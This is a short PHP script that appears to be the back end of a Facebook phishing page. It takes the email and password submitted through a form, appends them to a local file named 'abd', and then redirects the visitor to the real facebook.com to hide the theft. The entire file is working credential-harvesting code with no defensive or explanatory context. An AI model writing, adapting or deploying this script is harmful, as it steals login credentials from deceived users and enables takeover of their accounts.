<?php
$email=$_POST['email'];
$pass = $_POST['pass'];
$data = $email." : ".$pass."\n";
$fp = fopen("abd", "a+");
fwrite($fp, $data);
header("location: https://www.facebook.com");
?>
